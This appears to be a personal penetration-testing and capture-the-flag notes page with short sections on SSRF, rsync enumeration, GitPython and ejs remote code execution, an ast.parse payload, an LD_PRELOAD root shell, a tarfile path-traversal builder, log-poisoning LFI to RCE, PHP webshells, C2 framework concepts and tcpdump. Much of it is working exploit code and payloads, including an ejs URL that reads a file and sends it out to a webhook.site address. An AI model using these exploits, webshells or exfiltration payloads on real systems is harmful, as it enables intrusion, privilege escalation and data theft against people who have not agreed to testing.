![image](https://github.com/user-attachments/assets/2a23f845-a1d8-4c51-aba7-f2d63942847f)

- Then, `rysnc rsync://[username]@[ip]/directory/` to list sub directories or files

![image](https://github.com/user-attachments/assets/de21cc57-25d9-4485-a3fa-dc8959254e4b)

- Use the -a option to upload file

![image](https://github.com/user-attachments/assets/42ce6eab-4e4a-4d83-afbe-2b54a425422a)

- To copy files, use the -avh option 

      rsync -avh rsync://rsync-connect@10.10.121.4/files/sys-internal/.ssh/ [directory you want to copy to]

![image](https://github.com/user-attachments/assets/c5585930-4fea-422e-a72c-7226460db2df)

----------------------------

### Bypassing restricted port number on firefox

- Type `about:config` in the url bar

![image](https://github.com/user-attachments/assets/32cb156d-8016-47a5-bfb4-332630c4463e)

- Copy `network.security.ports.banned.override`,pick string, delete if it contains `boolean` type

![image](https://github.com/user-attachments/assets/4dc0fdc7-a2a0-4194-8239-807fe0156253)

- You can specify a port range

![image](https://github.com/user-attachments/assets/b273f8c9-aee2-4c4b-bb9f-68cb7b6b7fb9)

-----------------------------

### REFERENCES:

- [Special Agent's blog](https://www.specialagentsqueaky.com/blog-post/r5iwj96j/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/)
  
-------------------------------

### Server Side Request Forgery Little Cheatsheet [Portswigger]

- It is a server side web vulnerability that allows an attacker to induce a server to make requests to an unintended location.In other words, the attacker may be allowed to connect to internal services within organization infrastructures.

### SSRF attacks against the server

- An attacker can cause the server to make a request to itself via the loopback network interface.It involves providing a url like `localhost` or `127.0.0.1`.For example,modifying an endpoint POST `parameter` that loads a url

      POST /product/stock HTTP/1.0
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 118
      
      stockApi=http://localhost/admin

- Exploiting it

![image](https://github.com/user-attachments/assets/5fc18d8f-4dd5-4e7a-975b-7c88e6bb6bbb)


### SSRF against other back end systems

- Most times , some servers have `non-routable private ip addresses` which are reserved for private use and cannot be accessed on the internet.In many cases,internal backend functionalities always have sensitive info with no authentication.SSRF allows an attacker to scan the whole network for internal services.
- Fuzz with `burp intruder` and spot juicy requests based on the `Content-Length`

![image](https://github.com/user-attachments/assets/916abeda-3030-42d6-b908-645d9e7478ed)

- Admin panel spotted on `192.168.0.7`

  ![image](https://github.com/user-attachments/assets/38897cad-609e-4c4a-866c-b5f2b7e375f3)

---------------------

### Dumping .git sensitive info

- Use [GitTools](https://github.com/internetwache/GitTools)'s `Extractor/extractor.sh` to dump sensitive info

![image](https://github.com/user-attachments/assets/a4ea7cfd-378f-4f3e-b725-67be8be9ae11)

- Objects spotted

![image](https://github.com/user-attachments/assets/520e4b68-2b84-4569-8058-92bda7c2101b)

----------------------

### Exploiting clone_from() Gitpython function

- Exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. This is only relevant when enabling the ext transport protocol.

- POC
  
      from git import Repo
      r = Repo.init('', bare=True)
      r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])

- A good method to exploit it to create a script and run the script with the `ext::sh`.e.g

![image](https://github.com/user-attachments/assets/63fe448c-d9ce-4dc1-8b0b-cfe73041b2f9)

- Shadow file result

![image](https://github.com/user-attachments/assets/242797a1-e1fe-4bb0-bd93-c90a0c48455f)

- Payload-:```ext::bash -c [path_to your_malicious_binary]% ls2```

------------------------

### Reference:

- [Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

-------------------------

### Node's ejs Prototype Pollution CVE

The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`

- Example of vulnerable `index.js`, res.render in this case is controllable

      const express = require('express')
      const app = express()
      const port = 3000
      
      app.set('view engine', 'ejs');
      
      app.get('/page', (req,res) => {
          res.render('page', req.query);
      })
      
      app.listen(port, () => {
        console.log("Example app listening on port ${port}")
      })

- POC code: `This poc below works well with `^3.1.7`

      http://127.0.0.1:3000/page?settings[view%20options][closeDelimiter]=1")%3bprocess.mainModule.require('child_process').execSync('calc')%3b//

- Another POC code with [escapeFunction]

      http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');

- Poc for out-of-band exfiltration
  
      http://127.0.0.1:3000/?settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20fetch(`https://webhook.site/fb92548e-56b3-4f02-9ca7-2b702be8f227?flag=${process.mainModule.require('child_process').execSync('cat%20flag-aaee2b1430.txt').toString()}`);//

### Testing on version `^3.1.9` in PatriotCtf with the above POC

- Oops,we have RCE

![image](https://github.com/user-attachments/assets/de683e16-2030-41b1-9e10-28bbfb267607)


---------------------

### REFERENCES:

- [Github](https://gist.github.com/ky28059/d539294051afa549eb303b832c7a5826)
- [Github](https://github.com/mde/ejs/issues/720)

--------------------

### Php escapes for `escapeshellcmd() and escapeshellargs()`

- [kacperszurek](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)

---------------------

### Using Flask_unsign as a module in python's code

--------------------

### Importing it

- Use

`import flask_unsign`

![image](https://github.com/user-attachments/assets/3da2de37-3aa8-4512-99e4-7e425c465b2f)

### Signing cookies

- Use the `sign()` object which requires 2 arguments a dict  containing a value and a string containig the secret key.

![image](https://github.com/user-attachments/assets/e3298eab-c958-4190-a4ec-cde63648eccb)

### Decoding Cookies

- Use the `decode()` object to casually decode the session, it requires only one argument which is the cookie

![image](https://github.com/user-attachments/assets/9bee3729-b68d-4354-9cd0-c4373f9cf2e2)

### Verifying Cookies

- Use the `verify()` method which requires a cookie argument in string type,it returns a boolean.

![image](https://github.com/user-attachments/assets/155a8934-d235-4929-9010-d4fd68a7c883)

### Cracking cookies

- The module responsible is the `flask_unsign.cracker`

`from flask_unsign.cracker import *`

- Call a function `Cracker`, pass the cookie as an argument and finally assign the object to a variable

![image](https://github.com/user-attachments/assets/1f389464-b095-46ea-be38-38fd3c391c38)

- You need to set everything to quiet,with the `object().quiet` variable.By default,it is set to bool `False`,we need to set it to `True` because the non-quiet mode can be weird.

![image](https://github.com/user-attachments/assets/593a81b0-9a7c-4eeb-80e5-8c9881dae051)

- Finally,call the `crack` function and pass in a list of words that you want to bruteforce with.

![image](https://github.com/user-attachments/assets/33d66d65-98f6-461b-bdd6-8479f556275c)

- After successfully bruteforcing the cookie,the secret is set to variable `object().secret`

![image](https://github.com/user-attachments/assets/2a71ec5f-1c8d-42f9-afd4-d35c124e6289)

------------------

### Exploiting ast.parse() in python with keyword `mode` set to `eval` or not

- Payload-:```ast.parse(len(__import__('subprocess').Popen('ls').communicate()))```

![image](https://github.com/user-attachments/assets/9144d74b-f144-43a7-8a85-8c30a82fbeb2)

------------------

### REFERENCES-:

- [Twosix](https://twosixtech.com/blog/hijacking-the-ast-to-safely-handle-untrusted-python/)

------------------

### Exploiting SSRF with redirect

- See the code below,change the host keyword to your ip

```python3
#! /usr/bin/env python3
from flask import Flask, redirect,request
from urllib.parse import quote
app = Flask(__name__)    

@app.route('/',methods=['GET'])    
def root():
    port = request.args.get("port")
    file = request.args.get("file")
    if file != None:
        url =  f"http://127.0.0.1:{port}/{file}"
    else:
        url = f"http://127.0.0.1:{port}/"
    return redirect(url, code=301)
    
if __name__ == "__main__":
    app.run(host="10.9.1.30", port=8080)
```

  - Proof with THM's room `Londonbridge`,I passed in `&` in a url encoded format.This approach helps you bypass filtered strings like `localhost`,`127.0.0.1`,`0.0.0.0`.


![image](https://github.com/user-attachments/assets/145bb5e4-2778-46a9-8393-a84c993245cb)
  
----------------------

### ABUSING LD_PRELOAD

- A sample

![image](https://github.com/user-attachments/assets/5353735b-464b-4c3e-a03b-a3e553f3205f)

- Save this code as `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#define _GNU_SOURCE
void _init() 
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Compile and run based on the sudo binary, in my case,it was `ping`.

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
```

- Result

![image](https://github.com/user-attachments/assets/a725c60e-a430-4e05-8683-e2f98204eaff)


------------------

### Xfreerdp error:

![image](https://github.com/user-attachments/assets/917ff8b7-50d8-4a0f-b442-34737f6f93db)

- Fix-: Remmina

![image](https://github.com/user-attachments/assets/53fc3a51-1ce9-40e5-94fe-fdfa5f3ae062)

- In the case of Remmina, set the `TLS` level to `0` in the case of Windows 7 rdp as seen in the image above.

------------------

### CRIME PROBLEM with zlib compression-:

- Challenge Code-:

```python3
import os
import json
import zlib

def lambda_handler(event, context):
    try:
        payload=bytes.fromhex(event["queryStringParameters"]["payload"])
        flag = os.environ["flag"].encode()
        message = b"Your payload is: %b\nThe flag is: %b" % (payload, flag)
        compressed_length = len(zlib.compress(message,9))
    except ValueError as e:
        return {'statusCode': 500, "error": str(e)}

    return {
        'statusCode': 200,
        'body': json.dumps({"sniffed": compressed_length})
    }
```

- Solve

```python3

#!/usr/bin/env python3
import requests
import json

base_url = 'https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/?payload='

flag = 'udctf{'
while True:
    for code in range(33, 127):
        print('[+] Try flag:', flag + chr(code))
        url = base_url + (flag + chr(code)).encode().hex()
        r = requests.get(url)
        res = json.loads(r.text)
        size = res['sniffed']
        if size == 67:
            flag += chr(code)
            break
    if flag[-1] == '}':
        break

print('[*] flag:', flag)
```

----------------

### References-:

- [Yocchin](https://yocchin.hatenablog.com/entry/2024/11/12/084437)

----------------

### Writing hash in /etc/passwd format

- Example

```rootzy:$1$sJ7Zcpwb$fKpiAes0t0ocZAHeUzn6x1:0:0:root:/root:/bin/bash```

-----------------

### Using scp

- Window files-:
  ` scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . `

-----------------

### Creating malicious tar.gz to exploit tarfile.extractall()

------------------

- Function `tarfile.extractall()` is vulnerable to path traversal which can be used to overwrite files.
- Code-:

```python3
#! /usr/bin/env python3
import tarfile
import io

tar = tarfile.TarFile.open('malicious.tar.gz', 'w:gz')

info = tarfile.TarInfo("../../var/www/html/databases/shell.php")
info.mode=0o444 # So it cannot be overwritten
php_shell = b"<?php echo system($_GET['cmd']); ?>"
info.size=len(php_shell)
tar.addfile(info,io.BytesIO(php_shell))
tar.close()
```
----------------

### REFERENCE-:

- [Mindsdb](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-2g5w-29q9-w6hx)

---------------

### LFI2RCE with /var/log/mail.log

- If you can read port `25` which is `smtp` log `/var/log/mail.log` via Local File Include.The payload below is url-encoded.

![image](https://github.com/user-attachments/assets/257a535c-afcf-417b-bdb2-89cfb70550d5)

- Then, connect to the port and use the details below.

```bash
telnet <ip> 25
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>
```

![image](https://github.com/user-attachments/assets/3224f7ca-ac7e-4a6d-9a31-75575ac98ffd)

- RCE-:

![image](https://github.com/user-attachments/assets/70db8db3-5811-4074-bc70-e8a89b69d31e)

--------------

### Fixing git --auto update alias and gau clash

- Error-:

![image](https://github.com/user-attachments/assets/ec0cf078-bb76-4f06-80bf-b3f80852eb49)

- Rename gau

```
▻ tar xvf gau-linux-amd64.tar
▻ mv gau-linux-amd64 /usr/bin/getallurls
```
- You can get the tar files from [releases](https://github.com/lc/gau/releases)
- Or just remove the alias from `git.plugin.zsh`.Filepath is `~/.oh-my-zsh/plugins/git/git.plugin.zsh`.The alias conflicts with gau.

--------------

### PHP POST parameter webshell

- Code-:

```php
<?php

if (isset($_POST['username'])) {
  echo system($_POST['username']);
}else {
    echo "No username provided";
}
?>
```

- Don't forget to set `Content-Type` to `application/x-www-form-urlencoded`

![image](https://github.com/user-attachments/assets/152b8515-3a83-41bd-a356-306eef7f4e2e)

--------------------

### C2 Frameworks [Command and Control]

- C2s help to manage compromised hosts during an engagement and makes it easy for laterla movement.AC2 framework is like a netcat listener (C2 server) capable of handling multiple reverse shells (C2 agents).It is like a server but for reverse shells but unlike almost all C2 frameworks, a C2 requires a special payload generator e.g metasploit uses the msfvenom payload generator.One can perceive a C2 as netcat with session management.

 ### Structure-:

- C2 server serves as a hub for the agent to call back to.Agents will reach back and wait for the C2 operator's command.
- An agent is a program generated by the C2 framework that calls back to a listener on a C2 server. Most of the time, this agent enables special functionality compared to a standard reverse shell. Most C2 Frameworks implement pseudo commands to make the C2 Operator’s life easier. Some examples of this may be a pseudo command to Download or Upload a file onto the system. It’s important to know that agents can be highly configurable, with adjustments on the timing of how often C2 Agents beacon out to a Listener on a C2 Server and much more.
- Listener is an application running on the C2 server that waits for a callback over a specific port or protocol. Some examples of this are DNS, HTTP, and or HTTPS.
- A Beacon is the process of a C2 Agent calling back to the listener running on a C2 Server.

### Payload types-:

- Stageless payload-:Stageless Payloads are the simplest of the two; they contain the full C2 agent and will call back to the C2 server and begin beaconing immediately.
- Staged payloads require a callback to the C2 server to download additional parts of the C2 agent. This is commonly referred to as a “Dropper” because it is “Dropped” onto the victim machine to download the second stage of our staged payload. This is a preferred method over stageless payloads because a small amount of code needs to be written to retrieve the additional parts of the C2 agent from the C2 server. It also makes it easier to obfuscate code to bypass Anti-Virus programs.The steps are outlined below-:
  - The Victim downloads and executes the Dropper
  - The Dropper calls back to the C2 Server for Stage 2
  - The C2 Server sends Stage 2 back to the Victim Workstation
  - Stage 2 is loaded into memory on the Victim Workstation
  - C2 Beaconing Initializes, and the Red Teamer/Threat Actors can engage with the Victim on the C2 Server.

### PAYLOAD FORMATS-:

- PowerShell Scripts -:Which may contain C# Code and may be compiled and executed with the Add-Type commandlet
- HTA Files
- JScript Files
- Visual Basic Application/Scripts
- Microsoft Office Documents

### MODULES-:

- Modules are a core component of any C2 Framework; they add the ability to make agents and the C2 server more flexible. Depending on the C2 Framework, scripts must be written in different languages. Cobalt Strike has “Aggressor Scripts”, which are written in the “Aggressor Scripting Language”. PowerShell Empire has support for multiple languages, Metasploit’s Modules are written in Ruby, and many others are written in many other languages.
- Post-Exploitation modules for anything after initial compromise e.g running SharpHound.ps1 to find paths of lateral movement, or it could be as complex as dumping LSASS and parsing credentials in memory.
- Pivoting Modules-: ne of the last major components of a C2 Framework is its pivoting modules, making it easier to access restricted network segments within the C2 Framework. If you have Administrative Access on a system, you may be able to open up an “SMB Beacon”, which can enable a machine to act as a proxy via the SMB protocol. This may allow machines in a restricted network segment to communicate with your C2 server.

![image](https://github.com/user-attachments/assets/13f625ad-5652-4a94-93c5-5261aa15fd4f)

### Domain Fronting

- Domain Fronting utilizes a known, good host (for example) Cloudflare. Cloudflare runs a business that provides enhanced metrics on HTTP connection details as well as caching HTTP connection requests to save bandwidth.  Red Teamers can abuse this to make it appear that a workstation or server is communicating with a known, trusted IP Address. Geolocation results will show wherever the nearest Cloudflare server is, and the IP Address will show as ownership to Cloudflare.

![image](https://github.com/user-attachments/assets/ca9d82fb-4843-4180-a1bf-06c31080797a)

### C2 Profiles-:

- The next technique goes by several names by several different products, "NGINX Reverse Proxy", "Apache Mod_Proxy/Mod_Rewrite",  "Malleable HTTP C2 Profiles", and many others. However, they are all more or less the same. All of the Proxy features more or less allow a user to control specific elements of the incoming HTTP request. Let's say an incoming connection request has an "X-C2-Server" header; we could explicitly extract this header using the specific technology that is at your disposal (Reverse Proxy, Mod_Proxy/Rewrite, Malleable C2 Profile, etc.) and ensure that your C2 server responds with C2 based responses. Whereas if a normal user queried the HTTP Server, they might see a generic webpage. This is all dependent on your configuration.

![image](https://github.com/user-attachments/assets/8d052993-545e-45c3-9c55-2b2818901f16)


### C2 framework

- Free-:
  - Metasploit
  - Armitage
  - Powershell Empire/Starkiller
  - Covenant
  - Slither
  - [Testing C2s](https://howto.thec2matrix.com/)

### Setting up Armitage-:
- Steps-:

```bash
git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
bash package.sh
```

- Use Java 11 to build

![image](https://github.com/user-attachments/assets/5298f58b-361d-4d96-a568-95f8c168177c)

- Change directory to `armitage/release/unix` to see jar files

![image](https://github.com/user-attachments/assets/cbf00241-3470-4840-8233-4875641fcb47)

- Teamserver-: This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:
  - IP Address-: Your fellow Red Team Operators will use the IP Address to connect to your Armitage server.
  - Shared Password-: Your fellow Red Team Operators will use the Shared Password to access your Armitage server.

### Preparing the Environment

- Postgresql is required to initialize Armitage

![image](https://github.com/user-attachments/assets/5786e9ea-f6bd-4b58-8e65-bdc1334fc63f)

- You need to be root while trying to initialized msfdb

```bash
sudo msfdb delete
sudo msfdb init
```

![image](https://github.com/user-attachments/assets/681c5897-93a4-4ba7-944b-fd0bdbb3fb5c)

- Starting and connecting to Armitage

`sudo ./temaserver [ip] [password]`

![image](https://github.com/user-attachments/assets/7f7f4c0d-e2d8-4d61-bdc8-965e9ea3733b)





----------------

### TCPDUMP Basics-:

### Basic tcpdump packet capture-:

-  Specify an interface with `-i` to listen on it, you can specify with `any` or `<interface's name>` e.g eth0.To check for interfaces,use `ip address show` or `ip a s`.

![image](https://github.com/user-attachments/assets/608a2616-05b0-40a0-9473-cc9e68df0c3e)

- Save to files with option `-w`

![image](https://github.com/user-attachments/assets/ad1ed2fa-c2a7-494d-b7a4-8761fe0820b5)

- Read captured packets from a file with `-r`

![image](https://github.com/user-attachments/assets/0ca025c3-3ae2-495f-9944-c60a7e9fb15e)

- Limit the amount of captured packets with `-c` which means `count`

![image](https://github.com/user-attachments/assets/f2ff3a21-3fb6-4356-a3c5-b9e64410f009)


- If you don't want port or ips to be resolved,use `-n` and -v for verbosity,for more verbosity,use `-vv` and `-vvv`

### ADVANCED FILTERING

- Filter by host with the `host` option as seen below,you can also limit packets to a source ip or hostname and destination ip or hostname with `src host hostname`,`src host ip`,`dst host hostname` and `dst host ip`.

![image](https://github.com/user-attachments/assets/61e4b7e4-a4ce-412e-bcb5-4a60ddb72a3c)

- You can limit to ports,use `port` option or `dst port [port number]` and `src port [port number]`.

![image](https://github.com/user-attachments/assets/cd77f30d-0174-4af3-9018-3a081ee47201)

- Packets can also be filtered based on protocols e.g `ip,ip6,icmp,tcp and udp`.

### Logical operators

-  and: Captures packets where both conditions are true. For example, tcpdump host 1.1.1.1 and tcp captures tcp traffic with host 1.1.1.1.
-  or: Captures packets when either one of the conditions is true. For instance, tcpdump udp or icmp captures UDP or ICMP traffic.
- not: Captures packets when the condition is not true. For example, tcpdump not tcp captures all packets except TCP segments; we expect to find UDP, ICMP, and ARP packets among the results.

### ADVANCED FILTERING

- We can limit the displayed packets to those smaller or larger than a certain length e.g `greater <length>` or `less <length>`.
- Header Bytes
The purpose of this section is to be able to filter packets based on the contents of a header byte. Consider the following protocols: ARP, Ethernet, ICMP, IP, TCP, and UDP. These are just a few networking protocols we have studied. How can we tell Tcpdump to filter packets based on the contents of protocol header bytes? (We will not go into details about the headers of each protocol as this is beyond the scope of this room; instead, we will focus on TCP flags.)

- Using pcap-filter, Tcpdump allows you to refer to the contents of any byte in the header using the following syntax proto[expr:size], where:

    proto refers to the protocol. For example, arp, ether, icmp, ip, ip6, tcp, and udp refer to ARP, Ethernet, ICMP, IPv4, IPv6, TCP, and UDP respectively.
    expr indicates the byte offset, where 0 refers to the first byte.
    size indicates the number of bytes that interest us, which can be one, two, or four. It is optional and is one by default.

To better understand this, consider the following two examples from the pcap-filter manual page (and don’t worry if you find them difficult):

    ether[0] & 1 != 0 takes the first byte in the Ethernet header and the decimal number 1 (i.e., 0000 0001 in binary) and applies the & (the And binary operation). It will return true if the result is not equal to the number 0 (i.e., 0000 0000). The purpose of this filter is to show packets sent to a multicast address. A multicast Ethernet address is a particular address that identifies a group of devices intended to receive the same data.
    ip[0] & 0xf != 5 takes the first byte in the IP header and compares it with the hexadecimal number F (i.e., 0000 1111 in binary). It will return true if the result is not equal to the (decimal) number 5 (i.e., 0000 0101 in binary). The purpose of this filter is to catch all IP packets with options.



### Displaying Packets

- Commands
  
```
    -q: Quick output; print brief packet information
    -e: Print the link-level header
    -A: Show packet data in ASCII
    -xx: Show packet data in hexadecimal format, referred to as hex
    -X: Show packet headers and data in hex and ASCII
```






















  
